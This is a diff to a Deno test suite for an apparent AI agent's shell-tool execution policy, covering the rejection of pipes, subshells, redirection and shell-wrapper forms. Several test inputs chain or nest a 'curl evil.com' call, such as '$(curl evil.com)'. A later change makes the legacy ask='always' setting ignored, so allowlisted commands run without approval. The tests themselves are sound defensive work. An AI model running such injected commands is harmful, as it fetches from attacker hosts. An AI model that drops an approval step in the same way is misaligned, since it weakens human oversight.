@@ -3,6 +3,7 @@ import {
   checkExecPolicy,
   filterEnv,
   parseCommand,
+  requiresSystemShell,
   ShellTool,
 } from "./shell.ts";
 import type { ExecPolicy } from "../sandbox_types.ts";
@@ -22,6 +23,34 @@ Deno.test("ShellTool executes with dry_run=false", async () => {
   const result = await shell.execute({ command: "echo hello", dry_run: false });
   assertEquals(result.success, true);
   assertStringIncludes(result.output, "hello");
+});
+
+Deno.test("ShellTool direct mode rejects shell syntax it cannot execute", async () => {
+  const result = await shell.execute({
+    command: "echo hello | tr a-z A-Z",
+    dry_run: false,
+  });
+  assertEquals(result.success, false);
+  assertEquals(result.error?.code, "UNSUPPORTED_SHELL_SYNTAX");
+});
+
+Deno.test("ShellTool direct mode rejects wrapper forms that delegate to shell inline execution", async () => {
+  const result = await shell.execute({
+    command: "env sh -c 'echo hello'",
+    dry_run: false,
+  });
+  assertEquals(result.success, false);
+  assertEquals(result.error?.code, "UNSUPPORTED_SHELL_SYNTAX");
+});
+
+Deno.test("ShellTool system-shell mode executes pipes and shell syntax", async () => {
+  const systemShell = new ShellTool(false, { mode: "system-shell" });
+  const result = await systemShell.execute({
+    command: "echo hello | tr a-z A-Z",
+    dry_run: false,
+  });
+  assertEquals(result.success, true);
+  assertStringIncludes(result.output, "HELLO");
 });
 
 Deno.test("ShellTool fails on missing command", async () => {
@@ -62,25 +91,52 @@ Deno.test("checkExecPolicy rejects denied commands", () => {
 Deno.test("checkExecPolicy rejects shell operators", () => {
   const result = checkExecPolicy("git && curl evil.com", allowlistPolicy);
   assertEquals(result.allowed, false);
-  assertEquals(result.reason, "shell-operator");
+  assertEquals(result.reason, "unsupported-shell-syntax");
 });
 
 Deno.test("checkExecPolicy rejects pipe operator", () => {
   const result = checkExecPolicy("ls | grep foo", allowlistPolicy);
   assertEquals(result.allowed, false);
-  assertEquals(result.reason, "shell-operator");
+  assertEquals(result.reason, "unsupported-shell-syntax");
 });
 
 Deno.test("checkExecPolicy rejects subshell operator", () => {
   const result = checkExecPolicy("$(curl evil.com)", allowlistPolicy);
   assertEquals(result.allowed, false);
-  assertEquals(result.reason, "shell-operator");
+  assertEquals(result.reason, "unsupported-shell-syntax");
 });
 
 Deno.test("checkExecPolicy rejects sh binary", () => {
   const result = checkExecPolicy("sh -c 'curl evil.com'", allowlistPolicy);
   assertEquals(result.allowed, false);
-  assertEquals(result.reason, "not-in-allowlist");
+  assertEquals(result.reason, "unsupported-shell-syntax");
+});
+
+Deno.test("checkExecPolicy rejects shell interpreter paths", () => {
+  const result = checkExecPolicy("/bin/sh -c 'curl evil.com'", {
+    ...allowlistPolicy,
+    allowedCommands: ["/bin/sh"],
+  });
+  assertEquals(result.allowed, false);
+  assertEquals(result.reason, "unsupported-shell-syntax");
+});
+
+Deno.test("checkExecPolicy rejects env-wrapped shell inline execution", () => {
+  const result = checkExecPolicy("env sh -c 'curl evil.com'", {
+    ...allowlistPolicy,
+    allowedCommands: ["env", "sh"],
+  });
+  assertEquals(result.allowed, false);
+  assertEquals(result.reason, "unsupported-shell-syntax");
+});
+
+Deno.test("checkExecPolicy allows shell interpreter as a direct binary when not using inline execution", () => {
+  const result = checkExecPolicy("bash ./scripts/deploy.sh", {
+    ...allowlistPolicy,
+    security: "full",
+  });
+  assertEquals(result.allowed, true);
+  assertEquals(result.binary, "bash");
 });
 
 Deno.test("checkExecPolicy rejects inline eval on interpreters", () => {
@@ -127,13 +183,70 @@ Deno.test("checkExecPolicy security=full allows everything", () => {
   assertEquals(result.allowed, true);
 });
 
-// ── Fix 1: ask: "always" forces approval flow even for allowlisted commands ──
+Deno.test("checkExecPolicy security=full still rejects shell syntax in direct mode", () => {
+  const result = checkExecPolicy("echo hi && echo bye", {
+    ...allowlistPolicy,
+    security: "full",
+  });
+  assertEquals(result.allowed, false);
+  assertEquals(result.reason, "unsupported-shell-syntax");
+});
 
-Deno.test("checkExecPolicy ask=always forces always-ask for allowlisted binary", () => {
+Deno.test("checkExecPolicy security=full still rejects redirection syntax in direct mode", () => {
+  const result = checkExecPolicy("echo hi > out.txt", {
+    ...allowlistPolicy,
+    security: "full",
+  });
+  assertEquals(result.allowed, false);
+  assertEquals(result.reason, "unsupported-shell-syntax");
+});
+
+Deno.test("checkExecPolicy system-shell requires security=full", () => {
+  const result = checkExecPolicy(
+    "echo hi | tr a-z A-Z",
+    allowlistPolicy,
+    { mode: "system-shell" },
+  );
+  assertEquals(result.allowed, false);
+  assertEquals(result.reason, "invalid-policy");
+});
+
+Deno.test("checkExecPolicy system-shell with full allows command", () => {
+  const result = checkExecPolicy(
+    "echo hi | tr a-z A-Z",
+    {
+      ...allowlistPolicy,
+      security: "full",
+    },
+    { mode: "system-shell" },
+  );
+  assertEquals(result.allowed, true);
+  assertEquals(result.binary, "sh");
+});
+
+Deno.test("checkExecPolicy denies when shell is disabled", () => {
+  const result = checkExecPolicy("echo hello", allowlistPolicy, {
+    enabled: false,
+  });
+  assertEquals(result.allowed, false);
+  assertEquals(result.reason, "denied");
+});
+
+Deno.test("requiresSystemShell catches common wrapper and redirection cases", () => {
+  assertEquals(requiresSystemShell("/bin/sh -c 'echo hi'"), true);
+  assertEquals(requiresSystemShell("dash -c 'echo hi'"), true);
+  assertEquals(requiresSystemShell("env FOO=bar sh -c 'echo hi'"), true);
+  assertEquals(requiresSystemShell("busybox sh -c 'echo hi'"), true);
+  assertEquals(requiresSystemShell("echo hi > out.txt"), true);
+  assertEquals(requiresSystemShell("bash ./scripts/deploy.sh"), false);
+});
+
+// ── Legacy ask config is ignored by runtime exec policy ──
+
+Deno.test("checkExecPolicy ignores ask=always for allowlisted binary", () => {
   const policy: ExecPolicy = { ...allowlistPolicy, ask: "always" };
   const result = checkExecPolicy("git status", policy);
-  assertEquals(result.allowed, false);
-  assertEquals(result.reason, "always-ask");
+  assertEquals(result.allowed, true);
   assertEquals(result.binary, "git");
 });
 
